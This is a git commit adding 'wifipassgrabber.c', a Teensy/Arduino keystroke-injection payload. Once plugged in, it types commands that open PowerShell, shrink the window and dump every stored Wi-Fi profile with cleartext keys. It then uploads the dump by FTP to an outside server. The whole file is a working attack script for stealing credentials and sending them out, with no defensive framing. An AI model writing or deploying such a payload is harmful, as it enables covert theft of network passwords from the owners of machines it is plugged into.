1ed0c616f9a1204c3db55ba1e788f7414ba81597
BesimAltnok <besimaltnok@gmail.com>
2016-03-12 18:11:48 +0200

    Update and rename wifipassgrabber.md to wifipassgrabber.c

---
+++ payloads/wifipassgrabber.c
@@ -0,0 +1,126 @@
+
+ void setup()
+
+    {
+
+    delay(5000);
+
+    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+
+    Keyboard.set_key1(KEY_R);
+
+    Keyboard.send_now();
+
+    delay(500);
+
+    Keyboard.set_modifier(0);
+
+    Keyboard.set_key1(0);
+
+    Keyboard.send_now();
+    
+
+    Keyboard.print("powershell");
+
+    Keyboard.set_key1(KEY_ENTER);
+
+    Keyboard.send_now();
+
+    Keyboard.set_key1(0);
+
+    Keyboard.send_now();
+    
+    delay(3000);
+    Keyboard.print("mode con:cols=17 lines=8");
+
+    Keyboard.set_key1(KEY_ENTER);
+
+    Keyboard.send_now();
+
+    Keyboard.set_key1(0);
+
+    Keyboard.send_now();
+    
+    delay(3000);
+    Keyboard.print("B:");
+
+    Keyboard.set_key1(KEY_ENTER);
+
+    Keyboard.send_now();
+
+    Keyboard.set_key1(0);
+
+    Keyboard.send_now();
+    
+    delay(3000);
+    Keyboard.print("netsh wlan show profile name='*' key=clear > wifinfo.txt");
+
+    Keyboard.set_key1(KEY_ENTER);
+
+    Keyboard.send_now();
+
+    Keyboard.set_key1(0);
+
+    Keyboard.send_now();
+
+    delay(3000);
+    Keyboard.print("ftp -i ftpserver.com");
+
+    Keyboard.set_key1(KEY_ENTER);
+
+    Keyboard.send_now();
+
+    Keyboard.set_key1(0);
+
+    Keyboard.send_now();
+    
+    delay(3000);
+    Keyboard.print("username");
+
+    Keyboard.set_key1(KEY_ENTER);
+
+    Keyboard.send_now();
+
+    Keyboard.set_key1(0);
+
+    Keyboard.send_now();
+    
+    delay(3000);
+    Keyboard.print("password");
+
+    Keyboard.set_key1(KEY_ENTER);
+
+    Keyboard.send_now();
+
+    Keyboard.set_key1(0);
+
+    Keyboard.send_now();
+    
+    delay(3000);
+    Keyboard.print("cd www");
+
+    Keyboard.set_key1(KEY_ENTER);
+
+    Keyboard.send_now();
+
+    Keyboard.set_key1(0);
+
+    Keyboard.send_now();
+    
+    delay(3000);
+    Keyboard.print("put wifinfo.txt");
+
+    Keyboard.set_key1(KEY_ENTER);
+
+    Keyboard.send_now();
+
+    Keyboard.set_key1(0);
+
+    Keyboard.send_now();
+    }
+
+    void loop()
+
+    {
+
+    }
